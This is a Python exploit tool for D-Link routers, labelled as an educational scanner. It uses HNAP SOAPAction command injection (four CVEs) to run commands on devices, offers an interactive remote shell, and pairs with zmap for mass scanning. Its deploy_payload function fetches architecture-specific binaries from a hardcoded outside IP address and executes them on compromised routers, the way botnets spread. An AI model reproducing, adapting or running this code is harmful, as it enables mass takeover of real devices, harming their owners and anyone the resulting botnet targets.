#!/usr/bin/env python3
"""
D-Link HNAP Multi-CVE Exploit Scanner
CVE-2015-2051, CVE-2019-10891, CVE-2022-37056, CVE-2024-33112
Educational & Authorized Testing Only

Author: Security Research
Version: 1.0
"""

import argparse
import base64
import json
import random
import requests
import signal
import socket
import subprocess
import sys
import threading
import time
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from urllib.parse import urlparse

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Statistics:
    """Thread-safe statistics tracker"""
    def __init__(self):
        self.total_scanned = 0
        self.vulnerable_found = 0
        self.hnap_detected = 0
        self.timeouts = 0
        self.errors = 0
        self.rce_success = 0
        self.file_operations = 0
        self.start_time = time.time()
        self.lock = threading.Lock()
        self.vulnerable_hosts = []

    def increment_scanned(self):
        with self.lock:
            self.total_scanned += 1

    def increment_vulnerable(self, host, cve_list):
        with self.lock:
            self.vulnerable_found += 1
            self.vulnerable_hosts.append({
                'host': host,
                'cve': cve_list,
                'timestamp': datetime.now()
            })

    def increment_hnap(self):
        with self.lock:
            self.hnap_detected += 1

    def increment_timeouts(self):
        with self.lock:
            self.timeouts += 1

    def increment_errors(self):
        with self.lock:
            self.errors += 1

    def increment_rce(self):
        with self.lock:
            self.rce_success += 1

    def increment_payload_ops(self):
        with self.lock:
            self.file_operations += 1

    def get_stats(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            rate = self.total_scanned / elapsed if elapsed > 0 else 0
            return {
                'total': self.total_scanned,
                'vulnerable': self.vulnerable_found,
                'hnap': self.hnap_detected,
                'timeouts': self.timeouts,
                'errors': self.errors,
                'rce': self.rce_success,
                'payloads': self.file_operations,
                'elapsed': elapsed,
                'rate': rate,
                'hosts': self.vulnerable_hosts.copy()
            }

class HNAPExploit:
    """HNAP vulnerability exploitation engine"""

    HNAP_PAYLOADS = {
        'CVE-2015-2051': {
            'desc': 'D-Link DIR-645 GetDeviceSettings Command Injection',
            'targets': ['DIR-645', 'DIR-815', 'DIR-825', 'DIR-860L', 'DIR-865L', 'DIR-880L'],
            'method': 'GET',
            'endpoint': '/HNAP1/',
            'header': 'SOAPAction'
        },
        'CVE-2019-10891': {
            'desc': 'D-Link DIR-806 Command Injection',
            'targets': ['DIR-806'],
            'method': 'POST',
            'endpoint': '/HNAP1/',
            'header': 'SOAPAction'
        },
        'CVE-2022-37056': {
            'desc': 'D-Link Multiple Models HNAP Command Injection',
            'targets': ['DIR-820L', 'DIR-842', 'DIR-845L'],
            'method': 'POST',
            'endpoint': '/HNAP1/',
            'header': 'SOAPAction'
        },
        'CVE-2024-33112': {
            'desc': 'D-Link DIR-845L HNAP Command Injection',
            'targets': ['DIR-845L'],
            'method': 'POST',
            'endpoint': '/HNAP1/',
            'header': 'SOAPAction'
        }
    }

    def __init__(self, stats, timeout=8):
        self.stats = stats
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Connection': 'close'
        })

    def detect_hnap(self, host):
        """Detect if host supports HNAP protocol"""
        try:
            url = f"http://{host}/HNAP1/"
            headers = {
                'SOAPAction': '"http://purenetworks.com/HNAP1/GetDeviceSettings"',
                'Content-Type': 'text/xml; charset=utf-8'
            }

            body = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
               xmlns:xsd="http://www.w3.org/2001/XMLSchema" 
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetDeviceSettings xmlns="http://purenetworks.com/HNAP1/">
</GetDeviceSettings>
</soap:Body>
</soap:Envelope>'''

            response = self.session.post(url, headers=headers, data=body, timeout=self.timeout)

            # Check for HNAP indicators
            hnap_indicators = [
                'HNAP', 'GetDeviceSettings', 'SOAPActions', 
                'D-Link', 'purenetworks.com', 'DeviceType'
            ]

            for indicator in hnap_indicators:
                if indicator.lower() in response.text.lower():
                    self.stats.increment_hnap()
                    return True

        except Exception:
            pass

        return False

    def test_cve_2015_2051(self, host):
        """Test CVE-2015-2051 (DIR-645 GetDeviceSettings)"""
        try:
            # Generate unique marker for blind injection testing
            marker = f"HNAP_TEST_{random.randint(1000, 9999)}"

            # Command: echo marker > /tmp/test.txt
            cmd = f"echo {marker} > /tmp/test.txt"

            url = f"http://{host}/HNAP1/"
            headers = {
                'SOAPAction': f'"http://purenetworks.com/HNAP1/GetDeviceSettings/`{cmd}`"',
                'Content-Type': 'text/xml'
            }

            # First request - inject command
            response = self.session.get(url, headers=headers, timeout=self.timeout)

            # Second request - try to read the file
            read_cmd = "cat /tmp/test.txt"
            read_headers = {
                'SOAPAction': f'"http://purenetworks.com/HNAP1/GetDeviceSettings/`{read_cmd}`"'
            }

            time.sleep(0.5)  # Small delay for command execution
            read_response = self.session.get(url, headers=read_headers, timeout=self.timeout)

            # Check if our marker exists in any response
            if marker in str(response.text) or marker in str(read_response.text):
                return True

        except Exception:
            pass

        return False

    def test_cve_2019_10891(self, host):
        """Test CVE-2019-10891 (DIR-806)"""
        try:
            marker = f"CVE2019_{random.randint(1000, 9999)}"
            cmd = f"echo {marker}"

            url = f"http://{host}/HNAP1/"
            headers = {
                'SOAPAction': f'"http://purenetworks.com/HNAP1/GetDeviceSettings/`{cmd}`"',
                'Content-Type': 'text/xml; charset=utf-8',
                'Cookie': 'uid=LS32Srlx8N'
            }

            body = f'''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetDeviceSettings xmlns="http://purenetworks.com/HNAP1/">
<Command>`{cmd}`</Command>
</GetDeviceSettings>
</soap:Body>
</soap:Envelope>'''

            response = self.session.post(url, headers=headers, data=body, timeout=self.timeout)

            if response.status_code == 200 and len(response.text) > 100:
                return True

        except Exception:
            pass

        return False

    def test_cve_2022_37056(self, host):
        """Test CVE-2022-37056"""
        try:
            cmd = "id"
            url = f"http://{host}/HNAP1/"
            headers = {
                'SOAPAction': f'"http://purenetworks.com/HNAP1/GetDeviceSettings/`{cmd}`"'
            }

            response = self.session.get(url, headers=headers, timeout=self.timeout)

            # Check for command execution indicators
            if response.status_code == 200 and ('uid=' in response.text or 'gid=' in response.text):
                return True

        except Exception:
            pass

        return False

    def test_cve_2024_33112(self, host):
        """Test CVE-2024-33112 (DIR-845L)"""
        try:
            marker = f"DIR845L_{random.randint(1000, 9999)}"
            cmd = f"echo {marker} && pwd"

            url = f"http://{host}/HNAP1/"
            headers = {
                'SOAPAction': f'"http://purenetworks.com/HNAP1/GetDeviceSettings/`{cmd}`"',
                'Content-Type': 'application/xml'
            }

            response = self.session.post(url, headers=headers, timeout=self.timeout)

            if marker in response.text or '/bin' in response.text or '/tmp' in response.text:
                return True

        except Exception:
            pass

        return False

    def execute_command(self, host, command, cve_method='CVE-2015-2051'):
        """Execute command using specified CVE method"""
        try:
            if cve_method == 'CVE-2015-2051':
                return self._execute_2015_2051(host, command)
            elif cve_method == 'CVE-2019-10891':
                return self._execute_2019_10891(host, command)
            elif cve_method == 'CVE-2022-37056':
                return self._execute_2022_37056(host, command)
            elif cve_method == 'CVE-2024-33112':
                return self._execute_2024_33112(host, command)
        except Exception:
            pass

        return None

    def _execute_2015_2051(self, host, command):
        """Execute command via CVE-2015-2051"""
        try:
            url = f"http://{host}/HNAP1/"
            headers = {
                'SOAPAction': f'"http://purenetworks.com/HNAP1/GetDeviceSettings/`{command}`"'
            }

            response = self.session.get(url, headers=headers, timeout=self.timeout + 5)
            return response.text if response.status_code == 200 else None

        except Exception:
            return None

    def _execute_2019_10891(self, host, command):
        """Execute command via CVE-2019-10891"""
        try:
            url = f"http://{host}/HNAP1/"
            headers = {
                'SOAPAction': f'"http://purenetworks.com/HNAP1/GetDeviceSettings/`{command}`"',
                'Cookie': 'uid=LS32Srlx8N'
            }

            response = self.session.post(url, headers=headers, timeout=self.timeout + 5)
            return response.text if response.status_code == 200 else None

        except Exception:
            return None

    def _execute_2022_37056(self, host, command):
        """Execute command via CVE-2022-37056"""
        return self._execute_2015_2051(host, command)  # Same method

    def _execute_2024_33112(self, host, command):
        """Execute command via CVE-2024-33112"""
        return self._execute_2019_10891(host, command)  # Similar method

    def detect_architecture(self, host):
        """Detect target device architecture"""
        try:
            # Try to get architecture info
            arch_command = "uname -m"

            for cve in ['CVE-2015-2051', 'CVE-2019-10891', 'CVE-2022-37056', 'CVE-2024-33112']:
                result = self.execute_command(host, arch_command, cve)
                if result:
                    arch = result.strip().lower()
                    # Map common architectures to available binaries
                    if 'x86_64' in arch or 'i686' in arch or 'i386' in arch:
                        return 'x86'
                    elif 'armv7' in arch or 'armv6' in arch:
                        return 'arm7' if 'armv7' in arch else 'arm6'
                    elif 'armv5' in arch:
                        return 'arm5'
                    elif 'aarch64' in arch or 'arm64' in arch:
                        return 'arm'
                    elif 'mips' in arch:
                        return 'mips' if 'mipsel' not in arch else 'mpsl'
                    elif 'powerpc' in arch or 'ppc' in arch:
                        return 'ppc'
                    elif 'sh4' in arch:
                        return 'sh4'
                    elif 'arc' in arch:
                        return 'arc'
                    elif 'm68k' in arch:
                        return 'm68k'
                    break

            # Fallback: try common architectures
            return 'mips'  # Most common for routers

        except Exception:
            return 'mips'  # Default fallback

    def deploy_payload(self, host, server="http://84.200.81.239/bins/"):
        """Deploy and execute payload on vulnerable host"""
        try:
            # Detect architecture
            arch = self.detect_architecture(host)
            payload_url = f"{server}well.{arch}"

            # Create deployment command
            commands = [
                "cd /tmp",
                f"wget -q {payload_url} -O well.{arch} || curl -s {payload_url} -o well.{arch}",
                f"chmod +x well.{arch}",
                f"./well.{arch} {arch}",
                "sleep 2"
            ]

            full_command = "; ".join(commands)

            # Try different CVE methods
            for cve in ['CVE-2015-2051', 'CVE-2019-10891', 'CVE-2022-37056', 'CVE-2024-33112']:
                result = self.execute_command(host, full_command, cve)
                if result is not None:
                    self.stats.increment_payload_ops()
                    return True, arch

        except Exception:
            pass

        return False, None

    def verify_payload(self, host):
        """Verify payload is running on target using multiple detection methods"""
        try:
            # Enhanced verification commands
            check_commands = [
                # Check for binary file
                "ls -la /tmp/well.* 2>/dev/null",
                # Check for our markers
                "ls -la /tmp/.system_check /tmp/.heartbeat 2>/dev/null",
                # Check running processes
                "ps | grep well | grep -v grep",
                "ps aux | grep well | grep -v grep 2>/dev/null",
                # Check for network connections if applicable
                "netstat -tulpn 2>/dev/null | grep well || ss -tulpn 2>/dev/null | grep well",
                # Check for payload artifacts
                "cat /tmp/.system_check 2>/dev/null || echo 'no marker'",
                "cat /tmp/.heartbeat 2>/dev/null || echo 'no heartbeat'"
            ]

            evidence = []
            for check_cmd in check_commands:
                result = self._execute_reliable_command_with_output(host, check_cmd)
                if result and result.strip():
                    # Look for positive indicators
                    if any(indicator in result.lower() for indicator in 
                          ['well.', 'payload_', 'alive', 'system_check', 'heartbeat']):
                        evidence.append(result.strip())

            # Return True if we found multiple pieces of evidence
            if len(evidence) >= 2:
                return True, '; '.join(evidence)
            elif evidence:
                return True, evidence[0]
                
        except Exception:
            pass

        return False, None
    
    def _execute_reliable_command_with_output(self, host, command):
        """Execute command and return output - similar to _execute_reliable_command but returns result"""
        cve_methods = ['CVE-2015-2051', 'CVE-2019-10891', 'CVE-2022-37056', 'CVE-2024-33112']
        
        for cve in cve_methods:
            try:
                result = self.execute_command(host, command, cve)
                if result is not None and result.strip():
                    return result
            except Exception:
                continue
        return None

    def scan_single_host(self, host):
        """Comprehensive scan of single host"""
        self.stats.increment_scanned()
        vulnerable_cves = []

        # Remove protocol if present
        if host.startswith(('http://', 'https://')):
            host = urlparse(host).netloc

        # Extract IP/hostname without port
        if ':' in host and not host.count(':') > 1:  # IPv4 with port
            host = host.split(':')[0]

        try:
            # First, detect HNAP support
            if not self.detect_hnap(host):
                return None

            # Test each CVE
            cve_tests = [
                ('CVE-2015-2051', self.test_cve_2015_2051),
                ('CVE-2019-10891', self.test_cve_2019_10891),
                ('CVE-2022-37056', self.test_cve_2022_37056),
                ('CVE-2024-33112', self.test_cve_2024_33112)
            ]

            for cve_id, test_func in cve_tests:
                try:
                    if test_func(host):
                        vulnerable_cves.append(cve_id)
                except Exception:
                    continue

            if vulnerable_cves:
                self.stats.increment_vulnerable(host, vulnerable_cves)
                return {
                    'host': host,
                    'cve_list': vulnerable_cves,
                    'hnap_detected': True
                }

        except requests.exceptions.Timeout:
            self.stats.increment_timeouts()
        except Exception:
            self.stats.increment_errors()

        return None

def is_valid_target(target):
    """Quick validation for single target"""
    import socket
    import ipaddress
    
    # Clean target
    clean_target = target
    if target.startswith(('http://', 'https://')):
        clean_target = urlparse(target).netloc
    
    if ':' in clean_target and not clean_target.count(':') > 1:
        clean_target = clean_target.split(':')[0]
    
    # Validate IP
    try:
        ipaddress.ip_address(clean_target)
        return True
    except ValueError:
        try:
            socket.gethostbyname(clean_target)
            return True
        except socket.gaierror:
            return False

def validate_and_filter_targets(targets, console):
    """Validate and filter target list, removing invalid IPs and duplicates"""
    import socket
    import ipaddress
    
    valid_targets = []
    invalid_count = 0
    
    # Remove duplicates while preserving order
    seen = set()
    unique_targets = []
    for target in targets:
        if target not in seen:
            seen.add(target)
            unique_targets.append(target)
    
    for target in unique_targets:
        # Clean target (remove protocol, port if present)
        clean_target = target
        if target.startswith(('http://', 'https://')):
            clean_target = urlparse(target).netloc
        
        # Extract IP without port for IPv4
        if ':' in clean_target and not clean_target.count(':') > 1:
            clean_target = clean_target.split(':')[0]
        
        # Validate IP address
        try:
            ipaddress.ip_address(clean_target)
            valid_targets.append(clean_target)
        except ValueError:
            # Try to resolve hostname
            try:
                socket.gethostbyname(clean_target)
                valid_targets.append(clean_target)
            except socket.gaierror:
                invalid_count += 1
                continue
    
    # Print validation summary
    if invalid_count > 0:
        console.print(f"[yellow]⚠️  Filtered out {invalid_count} invalid targets[/yellow]")
    
    duplicates_removed = len(targets) - len(unique_targets)
    if duplicates_removed > 0:
        console.print(f"[yellow]⚠️  Removed {duplicates_removed} duplicate targets[/yellow]")
    
    console.print(f"[green]✅ Validated {len(valid_targets)} targets[/green]")
    
    return valid_targets

def create_status_display(stats):
    """Create rich status display"""
    data = stats.get_stats()

    # Main statistics table
    table = Table(title="🎯 D-Link HNAP Multi-CVE Exploit Scanner", 
                  title_style="bold red",
                  show_header=True, header_style="bold blue")

    table.add_column("Metric", style="cyan", width=20)
    table.add_column("Count", style="green", width=12)
    table.add_column("Details", style="white", width=30)

    # Add rows with emoji indicators
    table.add_row("🔍 Scanned", str(data['total']), f"{data['rate']:.1f}/sec")
    table.add_row("🎯 HNAP Detected", str(data['hnap']), "Devices supporting HNAP")
    table.add_row("💀 Vulnerable", f"[bold red]{data['vulnerable']}[/bold red]", "Multi-CVE affected hosts")
    table.add_row("🚀 RCE Success", f"[bold green]{data['rce']}[/bold green]", "Remote code execution")
    table.add_row("🚀 Payloads", str(data['payloads']), "Payload deployments")
    table.add_row("⏱️  Timeouts", str(data['timeouts']), "Connection timeouts")
    table.add_row("❌ Errors", str(data['errors']), "Network/protocol errors")
    table.add_row("⏳ Runtime", f"{data['elapsed']:.1f}s", f"Started at {datetime.now().strftime('%H:%M:%S')}")

    # Recent vulnerable hosts
    if data['hosts']:
        recent_hosts = []
        for host_info in data['hosts'][-5:]:  # Last 5 hosts
            cve_count = len(host_info['cve'])
            timestamp = host_info['timestamp'].strftime('%H:%M:%S')
            recent_hosts.append(f"🏠 {host_info['host']} ({cve_count} CVEs) @ {timestamp}")

        hosts_text = '\n'.join(recent_hosts)
        panel = Panel(hosts_text, title="🔥 Recent Vulnerable Hosts", border_style="red")
        return table, panel

    return table, None

def run_zmap_integration(target_range, port=80):
    """Integrate with zmap for target discovery"""
    console = Console()

    try:
        console.print(f"[blue]🗺️  Starting zmap scan on {target_range}:{port}[/blue]")

        zmap_cmd = [
            'zmap', 
            '-p', str(port),
            '-o', '/tmp/zmap_results.txt',
            '--output-fields=saddr',
            target_range
        ]

        process = subprocess.Popen(
            zmap_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        stdout, stderr = process.communicate()

        if process.returncode == 0:
            try:
                with open('/tmp/zmap_results.txt', 'r') as f:
                    targets = [line.strip() for line in f if line.strip()]
                console.print(f"[green]✅ zmap found {len(targets)} potential targets[/green]")
                return targets
            except FileNotFoundError:
                console.print("[red]❌ zmap results file not found[/red]")
                return []
        else:
            console.print(f"[red]❌ zmap failed: {stderr}[/red]")
            return []

    except FileNotFoundError:
        console.print("[red]❌ zmap not found! Install with: apt-get install zmap[/red]")
        return []
    except Exception as e:
        console.print(f"[red]❌ zmap error: {str(e)}[/red]")
        return []

def interactive_shell(host, exploit):
    """Interactive shell for vulnerable host"""
    console = Console()

    console.print(f"[green]🎯 Deploying payload on {host}...[/green]")

    # Deploy payload
    success, arch = exploit.deploy_payload(host)
    if success:
        console.print(f"[green]✅ Payload deployed successfully! Architecture: {arch}[/green]")
        exploit.stats.increment_rce()

        # Verify payload is running
        console.print("[blue]🔍 Verifying payload execution...[/blue]")
        time.sleep(2)  # Give payload time to start

        verified, details = exploit.verify_payload(host)
        if verified:
            console.print("[green]✅ Payload verified running![/green]")
            if details:
                console.print(f"[dim]Details: {details[:100]}...[/dim]")
        else:
            console.print("[yellow]⚠️  Payload verification failed (may still be running)[/yellow]")
    else:
        console.print("[red]❌ Payload deployment failed[/red]")

    console.print(f"\n[blue]🚀 Starting interactive shell for {host}[/blue]")
    console.print("[dim]Commands will be executed via HNAP injection[/dim]")
    console.print("[dim]Type 'exit' to quit, 'help' for commands[/dim]\n")

    while True:
        try:
            command = input(f"HNAP:{host}# ").strip()

            if command.lower() in ['exit', 'quit']:
                break
            elif command.lower() == 'help':
                console.print("""
[blue]Available commands:[/blue]
  help     - Show this help
  exit     - Exit shell  
  deploy   - Deploy payload again
  verify   - Check if payload is running
  arch     - Show device architecture
  ps       - Process list
  netstat  - Network connections
  ls       - List files
  pwd      - Show current directory
  id       - Show user info
  uname -a - System information
""")
                continue
            elif command.lower() == 'deploy':
                console.print("[blue]🚀 Redeploying payload...[/blue]")
                success, arch = exploit.deploy_payload(host)
                if success:
                    console.print(f"[green]✅ Payload redeployed! Architecture: {arch}[/green]")
                else:
                    console.print("[red]❌ Payload deployment failed[/red]")
                continue
            elif command.lower() == 'verify':
                console.print("[blue]🔍 Checking payload status...[/blue]")
                verified, details = exploit.verify_payload(host)
                if verified:
                    console.print("[green]✅ Payload is running![/green]")
                    if details:
                        console.print(f"[green]Details:[/green] {details}")
                else:
                    console.print("[red]❌ Payload not detected[/red]")
                continue
            elif command.lower() == 'arch':
                arch = exploit.detect_architecture(host)
                console.print(f"[blue]🏗️  Detected architecture: {arch}[/blue]")
                continue
            elif not command:
                continue

            # Execute command via CVE methods
            result = None
            for cve in ['CVE-2015-2051', 'CVE-2019-10891', 'CVE-2022-37056', 'CVE-2024-33112']:
                result = exploit.execute_command(host, command, cve)
                if result:
                    break

            if result:
                # Clean up XML response if present
                if '<?xml' in result:
                    result = result.split('<?xml')[0].strip()
                if result:
                    console.print(result)
                else:
                    console.print("[dim][No output][/dim]")
            else:
                console.print("[red][Command failed or no response][/red]")

        except KeyboardInterrupt:
            console.print("\n[red]Interrupted by user[/red]")
            break
        except EOFError:
            break

def signal_handler(signum, frame):
    """Handle Ctrl+C gracefully"""
    console = Console()
    console.print("\n[red]🛑 Scan interrupted by user[/red]")
    sys.exit(0)

def main():
    signal.signal(signal.SIGINT, signal_handler)

    parser = argparse.ArgumentParser(
        description="D-Link HNAP Multi-CVE Exploit Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
🎯 Supported CVEs:
  CVE-2015-2051 - DIR-645 GetDeviceSettings Command Injection  
  CVE-2019-10891 - DIR-806 Command Injection
  CVE-2022-37056 - Multiple Models HNAP Command Injection
  CVE-2024-33112 - DIR-845L HNAP Command Injection

📋 Examples:
  %(prog)s -f ip.txt -t 50                    # Scan IPs from file
  %(prog)s -f ip.txt -o results.txt           # Save results
  %(prog)s --zmap 192.168.1.0/24              # Use zmap discovery
  zmap -p 80 10.0.0.0/8 | %(prog)s           # Real-time pipe from zmap
        """
    )

    parser.add_argument('-f', '--file', help='File containing target IPs/URLs')
    parser.add_argument('-t', '--threads', type=int, default=500, help='Number of threads (default: 500)')
    parser.add_argument('-o', '--output', help='Output file for vulnerable hosts')
    parser.add_argument('--timeout', type=int, default=8, help='Connection timeout (default: 8s)')
    parser.add_argument('--zmap', help='Use zmap to discover targets (e.g., 192.168.1.0/24)')
    parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')

    args = parser.parse_args()

    console = Console()
    stats = Statistics()
    exploit = HNAPExploit(stats, timeout=args.timeout)


    # Multi-target modes
    targets = []

    if args.zmap:
        # zmap integration mode
        targets = run_zmap_integration(args.zmap, args.port)
        if not targets:
            console.print("[red]❌ No targets found via zmap[/red]")
            return
    elif args.file:
        # File mode
        try:
            with open(args.file, 'r') as f:
                raw_targets = [line.strip() for line in f if line.strip()]
                targets = validate_and_filter_targets(raw_targets, console)
        except FileNotFoundError:
            console.print(f"[red]❌ File '{args.file}' not found[/red]")
            sys.exit(1)
            
        if not targets:
            console.print("[red]❌ No valid targets found[/red]")
            sys.exit(1)

        # Display scan information for file mode
        console.print(Panel(f"""
🎯 [bold]D-Link HNAP Multi-CVE Scanner[/bold]
📊 Targets: {len(targets)}
🧵 Threads: {args.threads}
⏱️  Timeout: {args.timeout}s
🎭 CVEs: 2015-2051, 2019-10891, 2022-37056, 2024-33112
""", title="🚀 Scan Configuration", border_style="blue"))

        # Start scanning for file mode
        vulnerable_results = []

        with Live(refresh_per_second=2) as live:
            with ThreadPoolExecutor(max_workers=args.threads) as executor:
                # Submit all scan tasks
                futures = [executor.submit(exploit.scan_single_host, target.strip()) 
                          for target in targets]

                # Process results
                for future in as_completed(futures):
                    try:
                        result = future.result()
                        if result:
                            vulnerable_results.append(result)

                            # Write to output file immediately
                            if args.output:
                                with open(args.output, 'a') as f:
                                    f.write(f"{result['host']} - {', '.join(result['cve_list'])}\n")

                    except Exception:
                        stats.increment_errors()

                    # Update live display
                    table, panel = create_status_display(stats)
                    if panel:
                        live.update(Panel.fit(f"{table}\n\n{panel}"))
                    else:
                        live.update(table)
    else:
        # stdin mode (zmap pipe) - REAL-TIME STREAMING
        if sys.stdin.isatty():
            parser.print_help()
            sys.exit(1)
        
        console.print("[blue]📡 D-Link HNAP Scanner - Real-time mode[/blue]")
        console.print("[dim]💡 Scanning targets as they arrive from zmap...[/dim]")
        
        # Real-time streaming processing
        import queue
        import threading
        import time
        
        target_queue = queue.Queue(maxsize=args.threads * 2)  # Buffer 2x thread count
        vulnerable_results = []
        processed_count = 0
        start_time = time.time()
        last_status_time = time.time()
        
        def stdin_reader():
            """Read targets from stdin in separate thread"""
            line_count = 0
            try:
                for line in sys.stdin:
                    target = line.strip()
                    if target and is_valid_target(target):
                        target_queue.put(target)
                        line_count += 1
                        if line_count % 500 == 0:
                            console.print(f"[cyan]📡 Received {line_count} targets from zmap[/cyan]")
            except KeyboardInterrupt:
                pass
            finally:
                target_queue.put(None)  # Sentinel to stop processing
        
        # Start stdin reader thread
        reader_thread = threading.Thread(target=stdin_reader, daemon=True)
        reader_thread.start()
        
        console.print(f"[yellow]🚀 Threads: {args.threads} | Timeout: {args.timeout}s | CVEs: 2015-2051, 2019-10891, 2022-37056, 2024-33112[/yellow]")

        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            active_futures = set()
            
            while True:
                # Submit new tasks as targets arrive
                try:
                    target = target_queue.get(timeout=0.1)
                    if target is None:  # Sentinel value
                        break
                    
                    future = executor.submit(exploit.scan_single_host, target)
                    active_futures.add(future)
                    
                except queue.Empty:
                    pass
                
                # Process completed scans
                done_futures = set()
                for future in active_futures:
                    if future.done():
                        done_futures.add(future)
                        processed_count += 1
                        
                        try:
                            result = future.result()
                            if result:
                                vulnerable_results.append(result)
                                console.print(f"[red]💀 VULNERABLE: {result['host']} - CVEs: {', '.join(result['cve_list'])}[/red]")
                                
                                # Write to output file immediately
                                if args.output:
                                    with open(args.output, 'a') as f:
                                        f.write(f"{result['host']} - {', '.join(result['cve_list'])}\n")
                        except Exception:
                            stats.increment_errors()
                
                active_futures -= done_futures
                
                # Show periodic status
                current_time = time.time()
                if current_time - last_status_time > 10:  # Every 10 seconds
                    elapsed = current_time - start_time
                    rate = processed_count / elapsed if elapsed > 0 else 0
                    console.print(f"[dim]📊 Progress: {processed_count} scanned | {len(vulnerable_results)} vulnerable | Rate: {rate:.1f}/sec | Queue: {target_queue.qsize()} | Active: {len(active_futures)}[/dim]")
                    last_status_time = current_time
            
            # Wait for remaining tasks to complete
            if active_futures:
                console.print(f"[yellow]⏳ Finishing {len(active_futures)} remaining scans...[/yellow]")
                for future in active_futures:
                    processed_count += 1  # Count remaining tasks too
                    try:
                        result = future.result()
                        if result:
                            vulnerable_results.append(result)
                            console.print(f"[red]💀 VULNERABLE: {result['host']} - CVEs: {', '.join(result['cve_list'])}[/red]")
                            
                            if args.output:
                                with open(args.output, 'a') as f:
                                    f.write(f"{result['host']} - {', '.join(result['cve_list'])}\n")
                    except Exception:
                        stats.increment_errors()
        
        # Final summary
        elapsed_total = time.time() - start_time
        console.print(f"[blue]📡 Streaming completed![/blue]")
        console.print(f"[green]📊 Results: {processed_count} scanned | {len(vulnerable_results)} vulnerable | Time: {elapsed_total:.1f}s[/green]")
        
        if vulnerable_results:
            console.print("[red]💀 VULNERABLE HOSTS FOUND:[/red]")
            for result in vulnerable_results:
                console.print(f"  🎯 {result['host']} - {', '.join(result['cve_list'])}")
        
        if args.output:
            console.print(f"[cyan]📝 Results saved to: {args.output}[/cyan]")
        
        # Exit after streaming - no batch results to show
        return

    # Final results for batch modes
    console.print("\n" + "="*60)
    console.print("[bold green]🎯 SCAN COMPLETED[/bold green]")
    console.print("="*60)

    final_stats = stats.get_stats()
    console.print(f"[green]📊 Total scanned:[/green] {final_stats['total']}")
    console.print(f"[blue]🎯 HNAP detected:[/blue] {final_stats['hnap']}")
    console.print(f"[red]💀 Vulnerable found:[/red] {final_stats['vulnerable']}")
    console.print(f"[yellow]⏱️  Scan time:[/yellow] {final_stats['elapsed']:.1f} seconds")

    if vulnerable_results:
        console.print(f"\n[bold red]💀 VULNERABLE HOSTS ({len(vulnerable_results)}):[/bold red]")
        for result in vulnerable_results[:20]:  # Show first 20
            cve_list = ', '.join(result['cve_list'])
            console.print(f"  🎯 {result['host']} - [red]{cve_list}[/red]")

        if len(vulnerable_results) > 20:
            console.print(f"  [yellow]... and {len(vulnerable_results) - 20} more[/yellow]")

        if args.output:
            console.print(f"\n[green]📝 Results saved to: {args.output}[/green]")

if __name__ == "__main__":
    main()
